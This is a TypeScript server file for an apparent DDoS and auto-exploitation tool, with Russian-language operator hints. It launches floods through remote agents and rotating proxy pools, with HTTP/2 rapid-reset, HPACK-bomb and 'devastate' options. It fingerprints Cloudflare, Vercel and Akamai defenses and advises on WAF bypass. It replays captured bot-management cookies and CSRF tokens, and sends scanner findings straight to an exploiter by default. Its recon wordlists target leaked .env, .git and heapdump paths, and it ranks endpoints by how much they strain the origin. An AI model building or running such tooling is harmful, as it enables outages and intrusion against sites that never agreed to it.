        agentBroadcastStart({
          target: target.startsWith("http") ? target : `https://${target}`,
          method: attackMethod,
          concurrency: Math.min(autoWorkers, 400),
          duration: typeof duration === "number" ? duration : 0,
        });
        socket.emit("stats", { log: `📡 ${getAgentCount()} remote agent(s) started` });
      }
    } catch (err: unknown) {
      const message = getErrorMessage(err);
      console.error("Crash during startAttack:", err);
      socket.emit("stats", { log: `Node server crashed: ${message}` });
      socket.emit("attackEnd");
    }
  });

  socket.on("stopAttack", () => {
    const worker = socketWorkers.get(socket.id);
    if (worker) {
      worker.terminate();
      socketWorkers.delete(socket.id);
      socket.emit("attackEnd");
    }
    agentBroadcastStop();
  });

  // ───────────────────── Vuln Scanner ─────────────────────
  //
  // Start a Hunter worker that runs the configured vulnerability-detection techniques
  // against the given target. Findings stream in via vulnQueue → socket; any
  // flagged exploitable get auto-dispatched to the Exploiter worker.
  //
  // params:
  //   { target, enabledTechniques?, candidates?, authedEndpoints?,
  //     postCandidates?, writeCandidates?, knownTokens?, authHeaders?,
  //     ratePerSec?, allowDestructiveWrites?, autoExploit? }
  socket.on("vuln_scan_start", (params) => {
    try {
      const target = typeof params?.target === "string" ? params.target.trim() : "";
      if (!target) {
        socket.emit("vuln_log", { level: "error", message: "target required" });
        return;
      }
      // Kill any prior hunter for this socket.
      const prev = hunterWorkers.get(socket.id);
      if (prev) prev.terminate();

      // Authorize: clear the queue at scan start. UI sees `vuln_queue_cleared`.
      vulnQueue.clear();

      const authHeaders = (params?.authHeaders && typeof params.authHeaders === "object") ? params.authHeaders : {};
      const autoExploit = params?.autoExploit !== false; // default ON
      const autopilot   = params?.autopilot !== false;   // default ON — runs chainOrchestrator at end
      const exploiter = autoExploit ? ensureExploiter(socket.id, authHeaders) : null;

      const hunter = new Worker(join(__dirname, "./hunter/hunterWorker.js"), {
        workerData: {
          target,
          enabledTechniques: Array.isArray(params.enabledTechniques) ? params.enabledTechniques : undefined,
          candidates: Array.isArray(params.candidates) ? params.candidates : [],
          authedEndpoints: Array.isArray(params.authedEndpoints) ? params.authedEndpoints : [],
          postCandidates: Array.isArray(params.postCandidates) ? params.postCandidates : [],
          writeCandidates: Array.isArray(params.writeCandidates) ? params.writeCandidates : [],
          knownTokens: Array.isArray(params.knownTokens) ? params.knownTokens : [],
          authHeaders,
          ratePerSec: clampNumber(params.ratePerSec, 1, 50, 10),
          allowDestructiveWrites: !!params.allowDestructiveWrites,
          allowCredentialTesting: !!params.allowCredentialTesting,
        },
      });

      hunter.on("message", (msg) => {
        if (!msg || typeof msg !== "object") return;
        switch (msg.type) {
          case "log":
            socket.emit("vuln_log", { level: msg.level, message: `[hunter] ${msg.message}` });
            break;
          case "hunter_started":
            socket.emit("vuln_scan_started", { total_techniques: msg.total_techniques });
            break;
          case "technique_started":
            socket.emit("vuln_technique_started", { technique: msg.technique, title: msg.title });
            break;
          case "technique_done":
            socket.emit("vuln_technique_done", { technique: msg.technique, finding_count: msg.finding_count, elapsed_ms: msg.elapsed_ms, skipped: !!msg.skipped });
            break;
          case "vuln_found": {
            const stored = vulnQueue.addFinding(msg.finding);
            // Auto-dispatch exploitable findings to the Exploiter worker.
            if (autoExploit && stored.exploitable && stored.status === "queued") {
              const claim = vulnQueue.takeForExploit(stored.id);
              if (claim && exploiter) {
                exploiter.postMessage({ type: "exploit_request", finding: claim });
              }
            }
            break;
          }
          case "hunter_done": {
            socket.emit("vuln_scan_done", { total_findings: msg.total_findings, elapsed_ms: msg.elapsed_ms });
            if (autopilot && msg.total_findings > 0) {
              // Wait briefly so per-finding exploit chains have a chance to
              // settle, then run cross-finding orchestrator.
              socket.emit("autopilot_phase", { phase: "settling", message: "ждём завершения автоэксплоитов перед комбо-фазой…" });
              setTimeout(() => {
                socket.emit("autopilot_phase", { phase: "combining", message: "🤖 запускаю Chain Orchestrator — ищу межуязвимостные комбо…" });
                const abort = new AbortController();
                runOrchestrator({
                  snapshot: () => vulnQueue.all(),
                  emit: (ev: string, payload: any) => socket.emit(ev, payload),
                  signal: abort.signal,
                  ratePerSec: clampNumber(params.ratePerSec, 1, 50, 10) / 2,
                }).catch((e: any) => {
                  socket.emit("vuln_log", { level: "error", message: `[autopilot] orchestrator crashed: ${getErrorMessage(e)}` });
                  socket.emit("autopilot_done", { combos: [], story: "Orchestrator crashed — see log." });
                });
              }, 4_000);
            }
            break;
          }
        }
      });
      hunter.on("error", (e) => {
        socket.emit("vuln_log", { level: "error", message: `Hunter crashed: ${getErrorMessage(e)}` });
      });
      hunter.on("exit", (code) => {
        hunterWorkers.delete(socket.id);
        if (code !== 0) {
          socket.emit("vuln_log", { level: "warn", message: `Hunter exited (code ${code})` });
        }
      });
      hunterWorkers.set(socket.id, hunter);
    } catch (e) {
      socket.emit("vuln_log", { level: "error", message: `vuln_scan_start failed: ${getErrorMessage(e)}` });
    }
  });

  socket.on("vuln_scan_stop", () => {
    const h = hunterWorkers.get(socket.id);
    if (h) {
      try { h.postMessage({ type: "stop" }); } catch { /* */ }
      setTimeout(() => { try { h.terminate(); } catch { /* */ } }, 1000);
      hunterWorkers.delete(socket.id);
    }
    socket.emit("vuln_log", { level: "info", message: "scan stop requested" });
  });

  // Manual exploit trigger — for findings that the user wants to attack
  // even though they were not auto-queued (e.g. dismissed, replayed).
  socket.on("vuln_exploit_run", (params) => {
    const id = typeof params?.id === "string" ? params.id : "";
    if (!id) return;
    const f = vulnQueue.all().find((x) => x.id === id);
    if (!f) return;
    const authHeaders = (params?.authHeaders && typeof params.authHeaders === "object") ? params.authHeaders : {};
    const exp = ensureExploiter(socket.id, authHeaders);
    const claim = vulnQueue.takeForExploit(id);
    if (claim) exp.postMessage({ type: "exploit_request", finding: claim });
  });

  socket.on("vuln_dismiss", (params) => {
    const id = typeof params?.id === "string" ? params.id : "";
    if (id) vulnQueue.dismiss(id);
  });

  // On (re)connect, rehydrate the UI with the current snapshot so a tab
  // refresh doesn't lose state.
  socket.emit("vuln_snapshot", vulnQueue.all());

  socket.on("disconnect", () => {
    const worker = socketWorkers.get(socket.id);
    if (worker) {
      worker.terminate();
      socketWorkers.delete(socket.id);
    }
    const h = hunterWorkers.get(socket.id);
    if (h) { try { h.terminate(); } catch { /* */ } hunterWorkers.delete(socket.id); }
    const e = exploiterWorkers.get(socket.id);
    if (e) { try { e.terminate(); } catch { /* */ } exploiterWorkers.delete(socket.id); }
    console.log("Client disconnected", socket.id);
  });
});

// Broadcast pool stats every 3s during any active attack — gives UI a live view
// of how the pool is aging (dead grows, alive shrinks) without spamming idle UIs.
setInterval(() => {
  if (socketWorkers.size === 0) return;
  const s = proxyManager.stats();
  io.emit("stats", {
    proxies_total: s.total,
    proxies_alive: s.alive,
    proxies_cooldown: s.cooldown,
    proxies_dead: s.dead,
    bots: s.alive,
  });
}, 3000);

// ───────────────────── HTTP API ─────────────────────

function cors(res: express.Response) {
  res.setHeader("Access-Control-Allow-Origin", CORS_ORIGIN || "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
}

app.use((_req, res, next) => { cors(res); next(); });
app.options("*", (_req, res) => res.sendStatus(204));

app.get("/configuration", (_req, res) => {
  res.type("application/json").send({
    proxies: readFileSync(join(currentPath(), "data", "proxies.txt"), "utf-8"),
    uas: readFileSync(join(currentPath(), "data", "uas.txt"), "utf-8"),
  });
});

app.post("/configuration", bodyParser.json({ limit: "2mb" }), (req, res) => {
  const { proxies, uas } = req.body ?? {};
  if (typeof proxies !== "string" || typeof uas !== "string") {
    res.status(400).json({ error: "proxies and uas must be strings" });
    return;
  }
  writeFileSync(join(currentPath(), "data", "proxies.txt"), proxies, "utf-8");
  writeFileSync(join(currentPath(), "data", "uas.txt"), uas, "utf-8");
  // After manual edit, re-seed the in-memory pool from the new file
  const list = loadProxyFileFallback();
  if (list.length) proxyManager.replace(list);
  broadcastPool();
  res.json({ ok: true, proxies: list.length });
});

// Snapshot of the pool for the UI's per-proxy table. Returns up to 500
// rows, best-scored first. The UI requests this on demand (not via socket)
// to avoid streaming a 23k-row payload at every stats tick.
app.get("/proxies/list", (req, res) => {
  const limit = Math.max(10, Math.min(2000, Number(req.query.limit) || 500));
  res.json({ proxies: proxyManager.list(limit), total: proxyManager.size() });
});

// Per-country aggregation for the UI geo panel. Cheaper than re-aggregating
// on the client every render, especially when the pool has 20k proxies.
app.get("/proxies/countries", (_req, res) => {
  res.json({ countries: proxyManager.countries(), geoip: geoipStatus() });
});

// Diagnostic — UI uses this to show a warning banner if GeoIP isn't working.
app.get("/geoip/status", (_req, res) => {
  res.json(geoipStatus());
});

// ─── Test profiles (saved attack configurations) ──────────────────
//
// Tiny JSON-file storage at data/profiles.json. The UI lets you save the
// current target + method + delay + flags as a named profile and reload
// it later. Keeps users from re-typing the same target/settings every run.

const PROFILES_FILE = () => join(currentPath(), "data", "profiles.json");

interface TestProfile {
  name: string;
  target: string;
  method: string;
  delay: number;
  directMode?: boolean;
  useHarvest?: boolean;
  pattern?: string;
  // Persisted as-of-save L8 toggles. All optional so older profiles (saved
  // before L8 existed) round-trip cleanly — undefined ⇒ feature stays off
  // when loaded, which matches the legacy behavior.
  jitter?: string;
  subresources?: boolean;
  cacheBust?: boolean;
  varyHeaders?: boolean;
  rapidReset?: boolean;
  rangeAmplify?: boolean;
  parallelPools?: boolean;
  hpackBomb?: boolean;
  maxUploadMbps?: number;
  maxPower?: boolean;
  devastateMode?: boolean;
  savedAt: number;
}

function loadProfiles(): TestProfile[] {
  try {
    const raw = readFileSync(PROFILES_FILE(), "utf8");
    const j = JSON.parse(raw);
    return Array.isArray(j) ? j : [];
  } catch {
    return [];
  }
}

function saveProfiles(profiles: TestProfile[]): void {
  const dir = dirname(PROFILES_FILE());
  if (!existsSync(dir)) mkdirSync(dir, { recursive: true });
  writeFileSync(PROFILES_FILE(), JSON.stringify(profiles, null, 2));
}

app.get("/profiles", (_req, res) => {
  res.json({ profiles: loadProfiles() });
});

app.post("/profiles", bodyParser.json({ limit: "32kb" }), (req, res) => {
  const body = req.body ?? {};
  const name = String(body.name || "").trim();
  if (!name) {
    res.status(400).json({ error: "name required" });
    return;
  }
  if (name.length > 50) {
    res.status(400).json({ error: "name too long (max 50)" });
    return;
  }
  const profile: TestProfile = {
    name,
    target: String(body.target || ""),
    method: String(body.method || "cpp_bypass"),
    delay: Number(body.delay) || 50,
    directMode: !!body.directMode,
    useHarvest: !!body.useHarvest,
    pattern: body.pattern ? String(body.pattern) : "flat",
    jitter: body.jitter ? String(body.jitter) : "flat",
    subresources: !!body.subresources,
    cacheBust: !!body.cacheBust,
    varyHeaders: !!body.varyHeaders,
    rapidReset: !!body.rapidReset,
    rangeAmplify: !!body.rangeAmplify,
    parallelPools: !!body.parallelPools,
    hpackBomb: !!body.hpackBomb,
    maxUploadMbps: typeof body.maxUploadMbps === "number" &&
      body.maxUploadMbps >= 0 && body.maxUploadMbps < 10000
      ? body.maxUploadMbps : 0,
    maxPower: !!body.maxPower,
    devastateMode: !!body.devastateMode,
    savedAt: Date.now(),
  };
  const all = loadProfiles().filter((p) => p.name !== name);
  all.push(profile);
  if (all.length > 100) all.splice(0, all.length - 100);
  saveProfiles(all);
  res.json({ ok: true, profile });
});

app.delete("/profiles/:name", (req, res) => {
  const name = String(req.params.name || "").trim();
  const all = loadProfiles().filter((p) => p.name !== name);
  saveProfiles(all);
  res.json({ ok: true });
});

app.get("/proxies/status", (_req, res) => {
  const s = proxyManager.stats();
  res.json({
    ...s,
    source: proxyState.source,
    fromCache: proxyState.fromCache,
    fetchedAt: proxyState.fetchedAt,
    ageSec: proxyState.fetchedAt ? Math.floor((Date.now() - proxyState.fetchedAt) / 1000) : null,
    sources: proxyState.report ?? [],
    autoRefreshMin: AUTO_REFRESH_MINUTES,
    anonymity: proxyManager.anonymityStats(),
    skipTransparent,
  });
});

let anonymityProbeRunning = false;

app.post("/proxies/anonymity-check", bodyParser.json({ limit: "256kb" }), async (req, res) => {
  if (anonymityProbeRunning) {
    res.status(429).json({ error: "anonymity probe already in progress" });
    return;
  }
  const sampleSize = Math.min(500, Math.max(1, Number(req.body?.sampleSize) || 50));
  const concurrency = Math.min(50, Math.max(1, Number(req.body?.concurrency) || 10));
  const usable = proxyManager.usable();
  if (usable.length === 0) {
    res.status(400).json({ error: "no usable proxies — validate the pool first" });
    return;
  }
  // Stratified sample: probe up to sampleSize random usable proxies. Skip
  // SOCKS since anonymityProbe returns null for them (it can't read the
  // forwarded headers on a SOCKS tunnel cleanly).
  const httpish = usable.filter((p) => p.protocol === "http" || p.protocol === "https");
  if (httpish.length === 0) {
    res.status(400).json({ error: "no HTTP/HTTPS proxies in the pool (SOCKS-only)" });
    return;
  }
  const shuffled = httpish.slice().sort(() => Math.random() - 0.5).slice(0, sampleSize);

  anonymityProbeRunning = true;
  io.emit("stats", { log: `🕵 Anonymity probe: ${shuffled.length} прокси через httpbin (concurrency=${concurrency})` });
  const counts = { transparent: 0, anonymous: 0, elite: 0, unknown: 0 };
  let idx = 0;
  const workers = Array.from({ length: Math.min(concurrency, shuffled.length) }, async () => {
    while (true) {
      const i = idx++;
      if (i >= shuffled.length) return;
      const result = await anonymityProbe(shuffled[i], 6000);
      if (result) {
        proxyManager.setAnonymity(shuffled[i], result);
        counts[result]++;
      } else {
        counts.unknown++;
      }
    }
  });
  try {
    await Promise.all(workers);
    io.emit("stats", {
      log: `✅ Anonymity результат: 🥇 elite=${counts.elite} · 🥈 anon=${counts.anonymous} · ⚠ transparent=${counts.transparent} · ? unknown=${counts.unknown}`,
    });
    res.json({ probed: shuffled.length, ...counts });
  } catch (e) {
    res.status(500).json({ error: getErrorMessage(e) });
  } finally {
    anonymityProbeRunning = false;
  }
});

app.post("/proxies/skip-transparent", bodyParser.json({ limit: "1kb" }), (req, res) => {
  skipTransparent = !!req.body?.enabled;
  io.emit("stats", {
    log: skipTransparent
      ? "🛡 Атака будет пропускать прокси с утечкой IP (skip-transparent ON)"
      : "Атака использует все usable прокси без фильтра анонимности",
  });
  res.json({ skipTransparent });
});

// ASN batch resolver via ip-api.com /batch (free tier: 45 req/min, 100 IPs per
// batch). We sample the proxies most likely to be visible in the UI table —
// hostsNeedingAsn() prioritises unresolved entries. Cached on the manager
// across refreshes via the .cache/proxy-health.json file.
let asnLookupRunning = false;
app.post("/proxies/asn-resolve", bodyParser.json({ limit: "16kb" }), async (req, res) => {
  if (asnLookupRunning) {
    res.status(429).json({ error: "ASN lookup already in progress" });
    return;
  }
  const batchSize = Math.min(100, Math.max(1, Number(req.body?.batchSize) || 100));
  const hosts = proxyManager.hostsNeedingAsn(batchSize);
  if (hosts.length === 0) {
    res.json({ resolved: 0, message: "all known IPv4 proxies already have ASN cached" });
    return;
  }
  asnLookupRunning = true;
  try {
    const ctl = new AbortController();
    const timer = setTimeout(() => ctl.abort(), 15_000);
    const resp = await fetch(
      "http://ip-api.com/batch?fields=status,query,as,isp,countryCode",
      {
        method: "POST",
        signal: ctl.signal,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(hosts.map((ip) => ({ query: ip }))),
      },
    );
    clearTimeout(timer);
    if (!resp.ok) {
      res.status(502).json({ error: `ip-api responded ${resp.status}` });
      return;
    }
    const arr = await resp.json() as Array<{
      status: string;
      query: string;
      as?: string;
      isp?: string;
    }>;
    let resolved = 0;
    for (const item of arr) {
      if (item.status === "success") {
        const asn = item.as || item.isp || "?";
        proxyManager.setAsnForHost(item.query, asn);
        resolved++;
      }
    }
    io.emit("stats", {
      log: `🔬 ASN lookup: ${resolved}/${arr.length} IPs (через ip-api.com)`,
    });
    res.json({ resolved, total: arr.length });
  } catch (e) {
    res.status(500).json({ error: getErrorMessage(e) });
  } finally {
    asnLookupRunning = false;
  }
});

// ─── Target probe / stack detection ───────────────────────────────
//
// Before launching an attack the user clicks "probe" and we fetch the
// target once (direct, no proxy) to classify its stack. Returns server
// fingerprint + a human-readable recommendation. This catches the
// Vercel/Next.js auth-first case where every anon GET → 307 /login —
// without this the user wastes hours assuming it's CF.
interface TargetProbe {
  url: string;
  status: number;
  server: string;
  stack: string;             // "vercel" | "cloudflare" | "akamai" | "nginx" | "unknown" | ...
  location?: string;         // for redirects
  cfRay?: string;
  vercelId?: string;
  setCookie?: boolean;
  recommendation: string;    // user-facing hint
  fingerprints: Record<string, string>;
  // D: Auto-cookie capture. Anything the origin set in Set-Cookie during the
  // probe is forwarded back so the engine can replay it on every attack
  // request. Bot-management cookies (__cf_bm, cf_clearance, _cfuvid) are the
  // marquee case but we capture everything — session cookies often gate
  // expensive endpoints and replaying them defeats the "anon → /login" wall.
  capturedCookies?: string;        // formatted as "name1=val1; name2=val2"
  capturedCookieNames?: string[];  // for UI display
  // L8 — CSRF token scrape. Walks the main HTML for hidden input fields and
  // meta tags whose name matches the CSRF-token conventions of the major
  // frameworks (Django: `csrfmiddlewaretoken`, Rails: `authenticity_token`
  // + `<meta name="csrf-token">`, ASP.NET: `__RequestVerificationToken`,
  // Laravel: `_token`, generic: `csrf_token` / `_csrf` / `xsrf-token`).
  // When found, the attack worker injects it as both a header
  // (X-CSRF-Token / X-XSRF-Token) AND a form field — covers servers that
  // check either path.
  csrfToken?: string;
  csrfTokenName?: string;
  // L8 — HTTP/3 (QUIC) availability. Probe reads `Alt-Svc: h3=":443"` to
  // tell whether the origin advertises QUIC. Doesn't switch the attack
  // protocol (engine is h2-only) but informs the operator that HTTP/3 is
  // an unexploited surface that may have separate / weaker WAF coverage.
  http3?: { advertised: boolean; altSvc?: string; port?: number };
  // E: Sitemap/robots discovery. URLs scraped from /robots.txt + /sitemap.xml
  // so the operator doesn't guess "/api/health". Filtered to same-origin only
  // and capped to keep the rotation list reasonable.
  discoveredUrls?: string[];
  discoveredSource?: string;       // "robots.txt" / "sitemap.xml" / "both"
  // #58 Endpoint sweep — fans out to ~25 common paths + same-origin links
  // extracted from the main HTML + Next.js __NEXT_DATA__ API routes, fetches
  // each in parallel, classifies the response, and returns a ranked list.
  // The brain picks the top HOT entries and fills url_rotation. This is the
  // difference between "I'll bash GET / forever" and "I see what this app
  // actually exposes and which endpoints cost it the most to serve".
  endpointSweep?: EndpointSample[];
  // #70 L6.3 — Vulnerability findings from the probe suite (path traversal,
  // open redirect, SSRF, param pollution, NoSQL injection, JWT none-alg,
  // CRLF injection, race condition, verbose-error stack traces). Each entry
  // is something a human pentester should look at by hand. UI surfaces these
  // loudly because they're high-signal even when the load-test angle fails.
  vulnerabilities?: Array<{
    kind: string;
    url: string;
    evidence: string;
    severity: "low" | "medium" | "high" | "critical";
  }>;
}

interface EndpointSample {
  url: string;
  path: string;
  status: number;
  latencyMs: number;
  sizeBytes: number;
  contentType: string;
  cacheStatus?: string;
  classification: "hot" | "warm" | "auth" | "dead";
  reason: string;
  // #59 POST-sweep — when an endpoint returned 405 on GET but accepts POST,
  // we re-probe it with empty body and (if 2xx/400/422) re-classify as HOT
  // with this flag set. The brain uses `method` to pick the correct attack
  // method and to filter url_rotation to URLs matching that method.
  method?: "GET" | "POST" | "PUT" | "PATCH" | "DELETE" | "HEAD" | "OPTIONS";
  // L3 enrichment fields. wafLimitedRatio = доля 429/403 при WAF-probe.
  // authSizeDelta = size(auth response) − size(anon response). weight = final
  // combined score used by the brain for ranking — higher is a better attack
  // target (slow + uncached + json + auth-fat + WAF-tolerant).
  wafProbed?: boolean;
  wafLimitedRatio?: number;
  authSizeDelta?: number;
  weight?: number;
  // #72 L6.5 — Optional attack-time body override. When an endpoint requires
  // a specific payload to deliver maximum origin pain (GraphQL depth-bomb,
  // hand-crafted JSON, etc.), the sweep sets `attackBody` + `attackContentType`
  // here so the brain wires them into the engine's httpBody / httpContentType
  // automatically. Empty = use whatever the operator typed.
  attackBody?: string;
  attackContentType?: string;
}

function classifyStack(headers: Headers, status: number, location: string | null): {
  stack: string;
  cfRay?: string;
  vercelId?: string;
  recommendation: string;
} {
  const server = (headers.get("server") || "").toLowerCase();
  const cfRay = headers.get("cf-ray") || undefined;
  const vercelId = headers.get("x-vercel-id") || undefined;
  const akamai = headers.get("x-akamai-transformed");
  const cfCache = headers.get("cf-cache-status");
  const xCdn = (headers.get("x-cdn") || "").toLowerCase();

  let stack = "unknown";
  if (cfRay || cfCache || server.includes("cloudflare")) stack = "cloudflare";
  else if (vercelId || server === "vercel") stack = "vercel";
  else if (akamai) stack = "akamai";
  else if (server.includes("nginx")) stack = "nginx";
  else if (server.includes("apache")) stack = "apache";
  else if (xCdn.includes("incap") || headers.get("x-iinfo")) stack = "imperva";
  else if (server) stack = server;

  let recommendation = "";
  if (stack === "cloudflare") {
    if (status === 403 || status === 503) {
      recommendation = "CF блокирует или показывает challenge. Включай harvester (\"Обход WAF\") и используй residential прокси.";
    } else if (status >= 300 && status < 400 && location && location.includes("/cdn-cgi/challenge")) {
      recommendation = "CF Managed Challenge активен. Без harvester'а + residential проксей толку не будет.";
    } else if (status === 200) {
      recommendation = "CF в режиме прозрачного CDN. Долбить можно — но Bot Fight Mode может включиться от нагрузки.";
    } else {
      recommendation = "Cloudflare detected. На всякий запусти harvester.";
    }
  } else if (stack === "vercel") {
    if (status >= 300 && status < 400 && location) {
      recommendation = `Vercel + редирект на ${location}. Скорее всего Next.js middleware (auth-first). Долбить GET / бесполезно — все запросы будут 307. Тестируй конкретный публичный GET-эндпоинт ИЛИ POST с form body / session cookie.`;
    } else if (status === 405) {
      recommendation = "Vercel + 405 Method Not Allowed. Endpoint принимает только POST. Включи POST режим в UI.";
    } else if (status === 200) {
      recommendation = "Vercel + 200 на главную. Можно атаковать — но Vercel Functions сами скейлятся, потолок origin'а может быть очень высоким.";
    } else {
      recommendation = `Vercel-fronted (HTTP ${status}). Проверь Location/auth flow.`;
    }
  } else if (stack === "akamai" || stack === "imperva") {
    recommendation = `${stack} WAF на пути. Harvester + residential — обязательно. Без них даже до origin не доберёшься.`;
  } else if (stack === "nginx" || stack === "apache") {
    recommendation = "Голый origin без CDN/WAF. Долбить можно прямо — главное не положить себе же сеть.";
  } else {
    recommendation = "Стек не классифицирован. Проверь headers ниже и решай вручную.";
  }

  return { stack, cfRay, vercelId, recommendation };
}

// DoH resolver — query Cloudflare 1.1.1.1 over HTTPS instead of using the
// system DNS resolver. Keeps the operator's ISP from seeing what host the
// probe is about to hit. Cached per-host for a minute so repeated probes
// don't hammer Cloudflare.
const dohCache = new Map<string, { ip: string; expires: number }>();
async function resolveViaDoH(host: string): Promise<string | null> {
  // IPv4 literal? Skip the lookup.
  if (/^\d+\.\d+\.\d+\.\d+$/.test(host)) return host;
  const cached = dohCache.get(host);
  if (cached && cached.expires > Date.now()) return cached.ip;
  try {
    const ctl = new AbortController();
    const t = setTimeout(() => ctl.abort(), 3000);
    const r = await fetch(
      `https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(host)}&type=A`,
      {
        signal: ctl.signal,
        headers: { Accept: "application/dns-json" },
      },
    );
    clearTimeout(t);
    if (!r.ok) return null;
    const j = await r.json() as { Answer?: Array<{ data: string; type: number }> };
    const a = (j.Answer ?? []).find((x) => x.type === 1);
    if (!a) return null;
    dohCache.set(host, { ip: a.data, expires: Date.now() + 60_000 });
    return a.data;
  } catch {
    return null;
  }
}

// #58 Endpoint sweep — fan out probe to N candidate URLs and rank by how
// expensive they look for the origin to serve. The candidate set is the
// union of:
//   1. ~25 hardcoded common-path probes (health checks, auth endpoints,
//      feeds, well-known files) that almost every web app exposes.
//   2. Same-origin links scraped from the main page HTML (<a href>,
//      <form action>, <script src>, <link href>).
//   3. API routes extracted from the Next.js <script id="__NEXT_DATA__">
//      JSON blob — these reveal app-specific endpoints the operator would
//      never guess (e.g. /api/trpc/forum.recent.posts).
//
// Each candidate is fetched in parallel (capped concurrency=8) with a 4s
// timeout. The response is classified by status × content-type × size ×
// cache-status into hot/warm/auth/dead buckets:
//   - HOT  = dynamic 2xx (JSON API or server-rendered HTML, uncached, slow).
//           These touch the application code / DB on every request — best
//           load-test targets.
//   - WARM = static 2xx (CSS, JS, fonts, images, cached HTML). Loads the
//           edge CDN but barely touches origin.
//   - AUTH = 401/403/307→login. Need a session cookie to attack.
//   - DEAD = 404/4xx/5xx. Not useful.
const COMMON_PROBE_PATHS = [
  "/robots.txt",
  "/sitemap.xml",
  "/favicon.ico",
  "/manifest.json",
  "/.well-known/security.txt",
  "/api/health",
  "/api/status",
  "/api/ping",
  "/api/v1/health",
  "/api/auth/csrf",
  "/api/auth/session",
  "/api/auth/providers",
  "/api/users/me",
  "/api/me",
  "/api/config",
  "/feed",
  "/feed.xml",
  "/rss",
  "/rss.xml",
  "/atom.xml",
  "/login",
  "/signin",
  "/register",
  "/healthz",
  "/_next/data/index.json",
];

// #62 L4 — Deep recon wordlists. These are stack-aware so we don't waste
// probes hitting Wordpress paths on a Next.js site. ~50-80 entries per stack
// covering the highest-yield attack surfaces:
//   - Admin / debug endpoints (often left open in dev/staging)
//   - API spec leaks (swagger.json, openapi.json — reveal entire API)
//   - Source-control leaks (.env, .git/config, web.config.bak)
//   - SSO / OAuth endpoints (these are always expensive due to crypto)
//   - GraphQL endpoints (introspection-friendly = full schema dump)
//   - Stack-native deep paths (Next-auth + Vercel routes; WP REST endpoints)
const L4_GENERIC_WORDLIST = [
  "/admin", "/administrator", "/admin/login", "/admin/index.php",
  "/api/v1/users", "/api/v1/posts", "/api/v1/login", "/api/v1/admin",
  "/api/v2/users", "/api/v2/posts",
  "/api/users", "/api/posts", "/api/comments", "/api/search",
  "/api/upload", "/api/files", "/api/admin", "/api/admin/users",
  "/api/admin/login", "/api/internal", "/api/private",
  "/swagger", "/swagger.json", "/swagger-ui", "/swagger-ui.html",
  "/openapi.json", "/openapi.yaml", "/api-docs", "/api-docs.json", "/api/spec",
  "/graphql", "/api/graphql", "/v1/graphql", "/query", "/altair", "/playground",
  "/debug", "/debug/vars", "/debug/pprof", "/_debugbar", "/_profiler",
  "/metrics", "/prometheus", "/info", "/version", "/build",
  "/actuator", "/actuator/health", "/actuator/env", "/actuator/heapdump", "/actuator/threaddump",
  "/.env", "/.env.local", "/.env.production",
  "/.git/config", "/.git/HEAD", "/.git/index",
  "/config.json", "/web.config", "/web.config.bak",
  "/.well-known/openid-configuration", "/.well-known/oauth-authorization-server",
  "/oauth/token", "/oauth/authorize", "/oauth2/authorize", "/oauth2/token",
  "/saml/login", "/saml/metadata", "/sso", "/sso/saml",
  "/users.json", "/login.json", "/auth.json",
  "/api/v1/auth/login", "/api/v1/auth/register", "/api/v1/auth/refresh",
];

const L4_VERCEL_NEXTJS_WORDLIST = [
  "/api/auth/error", "/api/auth/_log", "/api/auth/verify-request",
  "/api/auth/callback", "/api/auth/callback/google", "/api/auth/callback/github",
  "/api/revalidate", "/api/middleware",
  "/_vercel/insights/event", "/_vercel/insights/view", "/_vercel/speed-insights",
  "/_next/image",
  "/api/og", "/api/og-image",
  "/api/cron", "/api/webhook", "/api/webhooks",
  "/api/trpc", "/api/trpc/healthcheck",
  "/api/edge-config", "/api/edge",
];

const L4_WORDPRESS_WORDLIST = [
  "/wp-json/wp/v2/users", "/wp-json/wp/v2/users/me",
  "/wp-json/wp/v2/posts", "/wp-json/wp/v2/pages",
  "/wp-json/wp/v2/comments", "/wp-json/wp/v2/media",
  "/wp-login.php", "/wp-admin/", "/wp-admin/admin-ajax.php",
  "/xmlrpc.php", "/wp-config.php.bak", "/wp-config.php~",
  "/wp-content/plugins/", "/wp-content/uploads/",
];

const L4_CLOUDFLARE_WORDLIST = [
  "/cdn-cgi/trace", "/cdn-cgi/health", "/cdn-cgi/ping",
  "/cdn-cgi/scripts/", "/cdn-cgi/zaraz/",
];

// #59 POST-only paths to probe with a second pass. These accept POST-with-body
// in nearly every Next-auth / form-driven app and are usually expensive on the
// origin side (DB writes / hashing / token issuance). GET on them returns 405
// — which is why the first sweep classifies them as DEAD. POST reveals their
// real nature.
const POST_ONLY_PROBE_PATHS = [
  "/api/auth/callback/credentials",
  "/api/auth/callback/email",
  "/api/auth/signin",
  "/api/auth/signin/email",
  "/api/auth/signout",
  "/api/auth/csrf",
  "/api/login",
  "/api/register",
  "/api/users",
  "/api/contact",
  "/api/feedback",
  "/api/subscribe",
  "/login",
  "/signin",
  "/register",
];

function classifyEndpoint(
  status: number,
  latencyMs: number,
  sizeBytes: number,
  contentType: string,
  cacheStatus: string | undefined,
  location: string | undefined,
): { classification: EndpointSample["classification"]; reason: string } {
  const ct = (contentType || "").toLowerCase();
  const loc = (location || "").toLowerCase();
  // #63 Aggressive AUTH classification. 401/403 with a real body + non-trivial
  // latency = the server VALIDATED the request before rejecting. That work
  // costs CPU even when the response is "denied" — bcrypt compare, JWT verify,
  // DB lookup. Each rejected request still drains the origin. For load-test
  // / amplification scenarios these are first-class targets and we promote
  // them to HOT. Only cheap middleware rejects (instant 401, empty body) stay
  // AUTH — those don't touch the application layer.
  const isAuthStatus = (status === 401 || status === 403);
  const isAuthRedirect = (status >= 300 && status < 400 &&
    (loc.includes("login") || loc.includes("signin") || loc.includes("auth")));
  if (isAuthStatus) {
    if (latencyMs >= 100 && sizeBytes >= 300) {
      return {
        classification: "hot",
        reason: `${status} processed-then-denied · ${latencyMs}ms · ${(sizeBytes / 1024).toFixed(1)}KB (server paid CPU)`,
      };
    }
    return { classification: "auth", reason: `${status} cheap-reject · ${latencyMs}ms` };
  }
  if (isAuthRedirect) return { classification: "auth", reason: `${status}${loc ? ` → ${loc}` : ""}` };
  if (status === 404 || status >= 500) return { classification: "dead", reason: `${status} dead` };
  if (status >= 400) return { classification: "dead", reason: `${status} ${ct || "?"}` };
  if (status < 200 || status >= 400) return { classification: "dead", reason: `unusable ${status}` };

  // 2xx / 3xx-non-auth path. Now decide hot vs warm.
  const isJson = ct.includes("json");
